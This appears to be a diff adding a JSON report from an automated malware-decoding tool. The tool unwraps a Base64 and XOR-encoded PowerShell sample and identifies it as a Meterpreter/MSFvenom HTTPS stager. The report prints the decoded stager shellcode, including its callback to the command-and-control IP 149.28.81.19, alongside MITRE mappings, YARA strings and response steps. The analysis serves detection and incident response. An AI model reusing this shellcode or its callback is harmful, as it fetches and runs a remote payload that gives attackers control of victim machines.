@@ -1,0 +1,607 @@
+{
+  "output": "üè\u0000\u0000\u0000`å1ÒdR0R\fR\u0014r(\u000f·J&1ÿ1À¬<a|\u0002, ÁÏ\r\u0001ÇâðRWR\u0010B<\u0001Ð@xÀtJ\u0001ÐPH\u0018X \u0001Óã<I4\u0001Ö1ÿ1À¬ÁÏ\r\u0001Ç8àuô\u0003}ø;}$uâXX$\u0001Óf\fKX\u001c\u0001Ó\u0004\u0001ÐD$$[[aYZQÿàX_Z\u0012ë]hnet\u0000hwiniThLw&\u0007ÿÕè\u0000\u0000\u0000\u00001ÿWWWWWh:Vy§ÿÕé¤\u0000\u0000\u0000[1ÉQQj\u0003QQh»\u0001\u0000\u0000SPhWÆÿÕPé\u0000\u0000\u0000[1ÒRh\u00002ÀRRRSRPhëU.;ÿÕÆÃPh3\u0000\u0000àj\u0004Pj\u001fVhuFÿÕ_1ÿWWjÿSVh-\u0006\u0018{ÿÕÀ\u000fÊ\u0001\u0000\u00001ÿöt\u0004ùë\thªÅâ]ÿÕÁhE!^1ÿÕ1ÿWj\u0007QVPh·Wà\u000bÿÕ¿\u0000/\u0000\u00009Çu\u0007XPé{ÿÿÿ1ÿé\u0001\u0000\u0000éÉ\u0001\u0000\u0000èoÿÿÿ/EZWf\u0000ko\u000bW«'±´ Ú\u0010ä´{­ö¥Úx¡ÉJ½¢Ûõ\u0015Û@PU³\u0015nö4rÝ¼ÅsÍL\bT<î|¹j\\÷ÚzÉF\u0018dç\u0000User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;PTBR)\r\n\u0000Ûu¸¦kò\u0010;fÇðÙhú d\rÌôÌFÊXù^º%Ð¢Iº8¾cð$\u0016t§\u0010ö¬.iì8\u0013dùõzê9];i\u0015¶7­\u000bAaZ>ÂÉ\f\u0004¶\u0013\u0017ö¢Tu%1X\u0002\u0001éE£â K(Ã×¦âäêæÇ\u0006ÍëÞ¦Ä(÷*nLÊ`§ÖÃtÇ,>®è;5û>:Q¯9\u0013\u0013g\u0011|=ép]ºN\u0014ÀEºÂWZí»Ö\b(Ç\u000bAouö\u0006±§PßÕF\u001e\u0016ºØtèhY%0WOÉ3xÅShgùß}PA\u0000hðµ¢VÿÕj@h\u0000\u0010\u0000\u0000h\u0000\u0000@\u0000WhX¤SåÿÕ¹\u0000\u0000\u0000\u0000\u0001ÙQSçWh\u0000 \u0000\u0000SVh\u0012âÿÕÀtÆ\u0007\u0001ÃÀuåXÃèýÿÿ149.28.81.19\u0000\u0000\u0000\u0000\u0003",
+  "trace": [
+    {
+      "layer": 0,
+      "decoder": "extract-wrapper",
+      "schema_version": "1.0",
+      "confidence": 0.95,
+      "why": "Wrapper detected: FromBase64String",
+      "in_len": 1170,
+      "out_len": 1112,
+      "exec_ms": 0,
+      "preview": "38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNL",
+      "args": {
+        "wrapper": "FromBase64String"
+      },
+      "sub_iocs": {},
+      "mitre_hints": [
+        {
+          "id": "T1059.001",
+          "technique": "Command and Scripting Interpreter: PowerShell",
+          "tactic": "Execution",
+          "evidence": "[Convert]::FromBase64String() wrapper",
+          "source": "archetype"
+        },
+        {
+          "id": "T1027",
+          "technique": "Obfuscated Files or Information",
+          "tactic": "Defense Evasion",
+          "evidence": "Base64-encoded PowerShell payload",
+          "source": "archetype"
+        }
+      ],
+      "family_hints": [],
+      "lolbas_hits": [
+        {
+          "binary": "powershell.exe",
+          "technique_id": "T1059.001",
+          "evidence": "[Convert]::FromBase64String wrapper"
+        }
+      ],
+      "tradecraft": []
+    },
+    {
+      "layer": 1,
+      "decoder": "base64-decode",
+      "schema_version": "1.0",
+      "confidence": 0.85,
+      "why": "Base64 alphabet fit, length mod 4 == 0, len=1112",
+      "in_len": 1112,
+      "out_len": 834,
+      "exec_ms": 0,
+      "preview": "ßËª###CªÆ\u0012ñG¨q\u0013¨q/¨q7¨Q\u000b,i\u0005\u0012Ü\u0012ã\u001fB_!\u000f\u0003âì.\"äÁÓqt¨q3¨a\u001f\"ó¨c[¦ãWi\"ós¨k;¨{\u0003\"ðÀ\u001fj¨\u0017¨\"õ\u0012Ü\u0012ãâì.\"ä\u001bÃV× ^Û\u0018^\u0007VÁ{¨{\u0007\"ðE¨/h¨{?\"ð¨'¨\"óªg\u0007\u0007xxBzyrÜÃ{|y¨1È¥~KMFW#KTJMJwKoT\u0005$ÜöË####\u0012ÜtttttK\u0019uZÜöÊ###x\u0012êrrI rrK\"##",
+      "args": {
+        "urlsafe": false
+      },
+      "sub_iocs": {},
+      "mitre_hints": [],
+      "family_hints": [],
+      "lolbas_hits": [],
+      "tradecraft": []
+    },
+    {
+      "layer": 2,
+      "decoder": "xor-brute",
+      "schema_version": "1.0",
+      "confidence": 0.65,
+      "why": "Binary payload (834 bytes, entropy 7.15) — brute-forceable",
+      "in_len": 834,
+      "out_len": 834,
+      "exec_ms": 1607,
+      "preview": "üè\u0000\u0000\u0000`å1ÒdR0R\fR\u0014r(\u000f·J&1ÿ1À¬<a|\u0002, ÁÏ\r\u0001ÇâðRWR\u0010B<\u0001Ð@xÀtJ\u0001ÐPH\u0018X \u0001Óã<I4\u0001Ö1ÿ1À¬ÁÏ\r\u0001Ç8àuô\u0003}ø;}$uâXX$\u0001Óf\fKX\u001c\u0001Ó\u0004\u0001ÐD$$[[aYZQÿàX_Z\u0012ë]hnet\u0000hwiniThLw&\u0007ÿÕè\u0000\u0000\u0000\u00001ÿWWWWWh:Vy§ÿÕé¤\u0000\u0000\u0000[1ÉQQj\u0003QQh»\u0001\u0000\u0000",
+      "args": {},
+      "sub_iocs": {
+        "ips": [
+          "149.28.81.19"
+        ]
+      },
+      "mitre_hints": [
+        {
+          "id": "T1027",
+          "technique": "Obfuscated Files or Information",
+          "tactic": "Defense Evasion",
+          "evidence": "XOR-obfuscated payload recovered; downstream magic: MSFvenom x86 reverse_tcp/https stager",
+          "source": "heuristic"
+        },
+        {
+          "id": "T1055.012",
+          "technique": "Process Hollowing",
+          "tactic": "Defense Evasion",
+          "evidence": "Detected MSFvenom x86 reverse_tcp/https stager — typical injection stager.",
+          "source": "heuristic"
+        }
+      ],
+      "family_hints": [
+        {
+          "family": "Meterpreter/MSFvenom stager",
+          "confidence": 0.85,
+          "evidence": "Shellcode prologue matched: MSFvenom x86 reverse_tcp/https stager",
+          "aka": [
+            "Metasploit stager"
+          ],
+          "evidence_items": [],
+          "mitre_techniques": [],
+          "yara_suggestion": null,
+          "atomic_red_hint": null
+        }
+      ],
+      "lolbas_hits": [],
+      "tradecraft": []
+    },
+    {
+      "layer": 3,
+      "decoder": "family-meterpreter",
+      "schema_version": "1.0",
+      "confidence": 0.25,
+      "why": "Meterpreter/MSFvenom stager signature scan matched weight=1.10 / cal=1.1",
+      "in_len": 834,
+      "out_len": 834,
+      "exec_ms": 0,
+      "preview": "üè\u0000\u0000\u0000`å1ÒdR0R\fR\u0014r(\u000f·J&1ÿ1À¬<a|\u0002, ÁÏ\r\u0001ÇâðRWR\u0010B<\u0001Ð@xÀtJ\u0001ÐPH\u0018X \u0001Óã<I4\u0001Ö1ÿ1À¬ÁÏ\r\u0001Ç8àuô\u0003}ø;}$uâXX$\u0001Óf\fKX\u001c\u0001Ó\u0004\u0001ÐD$$[[aYZQÿàX_Z\u0012ë]hnet\u0000hwiniThLw&\u0007ÿÕè\u0000\u0000\u0000\u00001ÿWWWWWh:Vy§ÿÕé¤\u0000\u0000\u0000[1ÉQQj\u0003QQh»\u0001\u0000\u0000",
+      "args": {
+        "scan_weight": 1.1
+      },
+      "sub_iocs": {},
+      "mitre_hints": [
+        {
+          "id": "T1055.012",
+          "technique": "Process Hollowing",
+          "tactic": "Defense Evasion",
+          "evidence": "Meterpreter/MSFvenom stager family match",
+          "source": "family"
+        },
+        {
+          "id": "T1059.001",
+          "technique": "PowerShell",
+          "tactic": "Execution",
+          "evidence": "Meterpreter/MSFvenom stager family match",
+          "source": "family"
+        },
+        {
+          "id": "T1027",
+          "technique": "Obfuscated Files or Information",
+          "tactic": "Defense Evasion",
+          "evidence": "Meterpreter/MSFvenom stager family match",
+          "source": "family"
+        },
+        {
+          "id": "T1071.001",
+          "technique": "Application Layer Protocol: Web Protocols",
+          "tactic": "Command and Control",
+          "evidence": "Meterpreter/MSFvenom stager family match",
+          "source": "family"
+        }
+      ],
+      "family_hints": [
+        {
+          "family": "Meterpreter/MSFvenom stager",
+          "confidence": 1.0,
+          "evidence": "2 signature(s) matched (weight 1.10/1.1)",
+          "aka": [
+            "Metasploit stager",
+            "MSFvenom",
+            "meterpreter/reverse_tcp",
+            "meterpreter/reverse_https"
+          ],
+          "evidence_items": [
+            {
+              "type": "opcode",
+              "pattern": "MSFvenom x86 stager prologue",
+              "location": "offset=0x0",
+              "weight": 0.55
+            },
+            {
+              "type": "opcode",
+              "pattern": "MSF block_api PEB walk",
+              "location": "offset=0xf",
+              "weight": 0.55
+            }
+          ],
+          "mitre_techniques": [
+            {
+              "id": "T1055.012",
+              "technique": "Process Hollowing",
+              "tactic": "Defense Evasion",
+              "evidence": "Meterpreter shellcode injection",
+              "source": "family"
+            },
+            {
+              "id": "T1059.001",
+              "technique": "PowerShell",
+              "tactic": "Execution",
+              "evidence": "PowerShell stager for Meterpreter payload",
+              "source": "family"
+            },
+            {
+              "id": "T1027",
+              "technique": "Obfuscated Files or Information",
+              "tactic": "Defense Evasion",
+              "evidence": "XOR/base64-encoded shellcode",
+              "source": "family"
+            },
+            {
+              "id": "T1071.001",
+              "technique": "Application Layer Protocol: Web Protocols",
+              "tactic": "Command and Control",
+              "evidence": "reverse_http(s) meterpreter C2",
+              "source": "family"
+            }
+          ],
+          "yara_suggestion": {
+            "name": "APT_Meterpreter_MSFvenom_Stager",
+            "strings": [
+              "$s0 = /\\xfc\\xe8[\\x82\\x89\\x8b\\x8c\\x8f]\\x00\\x00\\x00/ nocase",
+              "$s1 = /\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28/ nocase"
+            ],
+            "condition": "2 of them",
+            "tags": [
+              "meterpreter_msfvenom_stager",
+              "nivxray-auto"
+            ]
+          },
+          "atomic_red_hint": "T1055.012#T1055.012-1"
+        }
+      ],
+      "lolbas_hits": [],
+      "tradecraft": []
+    }
+  ],
+  "fingerprint_history": [
+    {
+      "input_len": 1170,
+      "printable_ratio": 1.0,
+      "english_density": 0.008264462809917356,
+      "entropy": 5.976,
+      "is_binary": false,
+      "encoding_candidates": [],
+      "file_type": null,
+      "wrapper_type": "powershell",
+      "notes": []
+    },
+    {
+      "input_len": 1112,
+      "printable_ratio": 1.0,
+      "english_density": 0.0,
+      "entropy": 5.896,
+      "is_binary": false,
+      "encoding_candidates": [],
+      "file_type": null,
+      "wrapper_type": null,
+      "notes": []
+    },
+    {
+      "input_len": 834,
+      "printable_ratio": 0.4880095923261391,
+      "english_density": 0.0,
+      "entropy": 7.152,
+      "is_binary": true,
+      "encoding_candidates": [],
+      "file_type": null,
+      "wrapper_type": null,
+      "notes": []
+    },
+    {
+      "input_len": 834,
+      "printable_ratio": 0.4748201438848921,
+      "english_density": 0.038461538461538464,
+      "entropy": 7.152,
+      "is_binary": true,
+      "encoding_candidates": [],
+      "file_type": null,
+      "wrapper_type": null,
+      "notes": []
+    }
+  ],
+  "terminal": "family-identified",
+  "stopped_reason": "Family 'Meterpreter/MSFvenom stager' identified with 85% confidence — stopping recursion at terminal state.",
+  "elapsed_ms": 1701,
+  "engine": "orchestrator-v1",
+  "findings": {
+    "verdict": "malicious",
+    "risk_score": 100,
+    "iocs": {
+      "urls": [],
+      "ips": [
+        "149.28.81.19"
+      ],
+      "domains": [],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": [],
+      "file_paths": []
+    },
+    "mitre_techniques": [
+      {
+        "id": "T1059.001",
+        "technique": "Command and Scripting Interpreter: PowerShell",
+        "tactic": "Execution",
+        "evidence": "[Convert]::FromBase64String() wrapper",
+        "source": "archetype"
+      },
+      {
+        "id": "T1027",
+        "technique": "Obfuscated Files or Information",
+        "tactic": "Defense Evasion",
+        "evidence": "Base64-encoded PowerShell payload",
+        "source": "archetype"
+      },
+      {
+        "id": "T1027",
+        "technique": "Obfuscated Files or Information",
+        "tactic": "Defense Evasion",
+        "evidence": "XOR-obfuscated payload recovered; downstream magic: MSFvenom x86 reverse_tcp/https stager",
+        "source": "heuristic"
+      },
+      {
+        "id": "T1055.012",
+        "technique": "Process Hollowing",
+        "tactic": "Defense Evasion",
+        "evidence": "Detected MSFvenom x86 reverse_tcp/https stager — typical injection stager.",
+        "source": "heuristic"
+      },
+      {
+        "id": "T1055.012",
+        "technique": "Process Hollowing",
+        "tactic": "Defense Evasion",
+        "evidence": "Meterpreter/MSFvenom stager family match",
+        "source": "family"
+      },
+      {
+        "id": "T1059.001",
+        "technique": "PowerShell",
+        "tactic": "Execution",
+        "evidence": "Meterpreter/MSFvenom stager family match",
+        "source": "family"
+      },
+      {
+        "id": "T1027",
+        "technique": "Obfuscated Files or Information",
+        "tactic": "Defense Evasion",
+        "evidence": "Meterpreter/MSFvenom stager family match",
+        "source": "family"
+      },
+      {
+        "id": "T1071.001",
+        "technique": "Application Layer Protocol: Web Protocols",
+        "tactic": "Command and Control",
+        "evidence": "Meterpreter/MSFvenom stager family match",
+        "source": "family"
+      }
+    ],
+    "family": {
+      "family": "Meterpreter/MSFvenom stager",
+      "confidence": 1.0,
+      "evidence": [
+        "2 signature(s) matched (weight 1.10/1.1)"
+      ],
+      "alternatives": [],
+      "evidence_items": [
+        {
+          "type": "opcode",
+          "pattern": "MSFvenom x86 stager prologue",
+          "location": "offset=0x0",
+          "weight": 0.55
+        },
+        {
+          "type": "opcode",
+          "pattern": "MSF block_api PEB walk",
+          "location": "offset=0xf",
+          "weight": 0.55
+        }
+      ],
+      "mitre_techniques": [
+        {
+          "id": "T1055.012",
+          "technique": "Process Hollowing",
+          "tactic": "Defense Evasion",
+          "evidence": "Meterpreter shellcode injection",
+          "source": "family"
+        },
+        {
+          "id": "T1059.001",
+          "technique": "PowerShell",
+          "tactic": "Execution",
+          "evidence": "PowerShell stager for Meterpreter payload",
+          "source": "family"
+        },
+        {
+          "id": "T1027",
+          "technique": "Obfuscated Files or Information",
+          "tactic": "Defense Evasion",
+          "evidence": "XOR/base64-encoded shellcode",
+          "source": "family"
+        },
+        {
+          "id": "T1071.001",
+          "technique": "Application Layer Protocol: Web Protocols",
+          "tactic": "Command and Control",
+          "evidence": "reverse_http(s) meterpreter C2",
+          "source": "family"
+        }
+      ],
+      "yara_suggestion": {
+        "name": "APT_Meterpreter_MSFvenom_Stager",
+        "strings": [
+          "$s0 = /\\xfc\\xe8[\\x82\\x89\\x8b\\x8c\\x8f]\\x00\\x00\\x00/ nocase",
+          "$s1 = /\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28/ nocase"
+        ],
+        "condition": "2 of them",
+        "tags": [
+          "meterpreter_msfvenom_stager",
+          "nivxray-auto"
+        ]
+      },
+      "atomic_red_hint": "T1055.012#T1055.012-1"
+    },
+    "lolbas": [
+      {
+        "binary": "powershell.exe",
+        "technique_id": "T1059.001",
+        "evidence": "[Convert]::FromBase64String wrapper"
+      }
+    ],
+    "tradecraft": [],
+    "kill_chain_phases": [],
+    "similar_cases": []
+  },
+  "executive_summary": "Deterministically decoded 4 layer(s): extract-wrapper → base64-decode → xor-brute → family-meterpreter. Identified family: **Meterpreter/MSFvenom stager** (100% confidence). MITRE ATT&CK: T1059.001, T1027, T1027, T1055.012, T1055.012, T1059.001…. IOCs: 1 ips. LOLBAS usage: powershell.exe. Verdict: **malicious** (risk 100/100).",
+  "investigation_steps": [
+    {
+      "priority": "high",
+      "action": "Block and hunt for outbound connections to: 149.28.81.19",
+      "rationale": "IP indicators extracted from decoded payload.",
+      "related_iocs": [
+        "149.28.81.19"
+      ]
+    },
+    {
+      "priority": "critical",
+      "action": "Trigger IR playbook for Meterpreter/MSFvenom stager",
+      "rationale": "High-confidence family match (100%).",
+      "related_iocs": []
+    }
+  ],
+  "sigma_rules": [],
+  "yara_rules": [],
+  "confidence_breakdown": {
+    "total": 100,
+    "verdict": "malicious",
+    "contributions": [
+      {
+        "source": "family-match",
+        "points": 55,
+        "detail": "High-confidence family: Meterpreter/MSFvenom stager (100%)"
+      },
+      {
+        "source": "mitre",
+        "points": 64,
+        "detail": "8 MITRE technique(s): T1027, T1055.012, T1059.001, T1071.001"
+      },
+      {
+        "source": "iocs",
+        "points": 4,
+        "detail": "1 IPs, 0 URLs, 0 domains extracted"
+      },
+      {
+        "source": "lolbas",
+        "points": 4,
+        "detail": "LOLBAS usage: powershell.exe"
+      }
+    ]
+  },
+  "plugin_report": {
+    "layers_run": 4,
+    "entries": [
+      {
+        "plugin": "extract-wrapper",
+        "layer": 0,
+        "outcome": "accepted",
+        "detect_confidence": 0.95,
+        "detect_reason": "Wrapper detected: FromBase64String",
+        "exec_ms": 0,
+        "reason": "high-confidence transform",
+        "signals_emitted": true
+      },
+      {
+        "plugin": "base64-decode",
+        "layer": 1,
+        "outcome": "accepted",
+        "detect_confidence": 0.85,
+        "detect_reason": "Base64 alphabet fit, length mod 4 == 0, len=1112",
+        "exec_ms": 0,
+        "reason": "high-confidence transform",
+        "signals_emitted": false
+      },
+      {
+        "plugin": "xor-brute",
+        "layer": 2,
+        "outcome": "accepted",
+        "detect_confidence": 0.65,
+        "detect_reason": "Binary payload (834 bytes, entropy 7.15) — brute-forceable",
+        "exec_ms": 1607,
+        "reason": "soft improvement",
+        "signals_emitted": true
+      },
+      {
+        "plugin": "family-agenttesla",
+        "layer": 3,
+        "outcome": "detect_zero",
+        "detect_confidence": 0.0,
+        "detect_reason": "",
+        "exec_ms": 0,
+        "reason": "intelligence-pass: no signatures matched",
+        "signals_emitted": false
+      },
+      {
+        "plugin": "family-asyncrat",
+        "layer": 3,
+        "outcome": "detect_zero",
+        "detect_confidence": 0.0,
+        "detect_reason": "",
+        "exec_ms": 0,
+        "reason": "intelligence-pass: no signatures matched",
+        "signals_emitted": false
+      },
+      {
+        "plugin": "family-cobaltstrike",
+        "layer": 3,
+        "outcome": "detect_zero",
+        "detect_confidence": 0.0,
+        "detect_reason": "",
+        "exec_ms": 0,
+        "reason": "intelligence-pass: no signatures matched",
+        "signals_emitted": false
+      },
+      {
+        "plugin": "family-darkgate",
+        "layer": 3,
+        "outcome": "detect_zero",
+        "detect_confidence": 0.0,
+        "detect_reason": "",
+        "exec_ms": 0,
+        "reason": "intelligence-pass: no signatures matched",
+        "signals_emitted": false
+      },
+      {
+        "plugin": "family-lumma",
+        "layer": 3,
+        "outcome": "detect_zero",
+        "detect_confidence": 0.0,
+        "detect_reason": "",
+        "exec_ms": 0,
+        "reason": "intelligence-pass: no signatures matched",
+        "signals_emitted": false
+      },
+      {
+        "plugin": "family-meterpreter",
+        "layer": 3,
+        "outcome": "accepted",
+        "detect_confidence": 0.25,
+        "detect_reason": "Meterpreter/MSFvenom stager signature scan matched weight=1.10 / cal=1.1",
+        "exec_ms": 0,
+        "reason": "intelligence-pass: signals emitted",
+        "signals_emitted": true
+      },
+      {
+        "plugin": "family-quasarrat",
+        "layer": 3,
+        "outcome": "detect_zero",
+        "detect_confidence": 0.0,
+        "detect_reason": "",
+        "exec_ms": 0,
+        "reason": "intelligence-pass: no signatures matched",
+        "signals_emitted": false
+      },
+      {
+        "plugin": "family-remcos",
+        "layer": 3,
+        "outcome": "detect_zero",
+        "detect_confidence": 0.0,
+        "detect_reason": "",
+        "exec_ms": 0,
+        "reason": "intelligence-pass: no signatures matched",
+        "signals_emitted": false
+      },
+      {
+        "plugin": "family-snake-keylogger",
+        "layer": 3,
+        "outcome": "detect_zero",
+        "detect_confidence": 0.0,
+        "detect_reason": "",
+        "exec_ms": 0,
+        "reason": "intelligence-pass: no signatures matched",
+        "signals_emitted": false
+      }
+    ],
+    "total_time_ms": 1701,
+    "budget_snapshot": {
+      "max_depth": 12,
+      "max_branches": 3,
+      "wall_time_ms": 5000,
+      "elapsed_ms": 1705
+    }
+  }
+}
